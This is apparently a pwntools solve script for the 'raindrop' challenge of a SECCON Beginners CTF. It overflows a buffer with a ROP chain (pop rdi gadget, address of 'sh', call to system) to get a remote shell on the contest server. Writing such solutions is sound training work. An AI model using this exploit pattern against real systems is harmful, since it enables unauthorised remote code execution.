from pwn import *
from ctftools.pwn.common import connect
from ctftools.pwn.search import objdump_search

exe = ELF("chall")
io = connect(exe, "raindrop.quals.beginners.seccon.jp", 9001)

rop = ROP(exe)
payload = flat(
    bytes(0x18),
    rop.find_gadget(["pop rdi", "ret"])[0],
    next(exe.search(b"sh\x00")),
    pack(objdump_search("chall", ["call", "system"])[0]),
)
io.sendline(payload)
io.interactive()
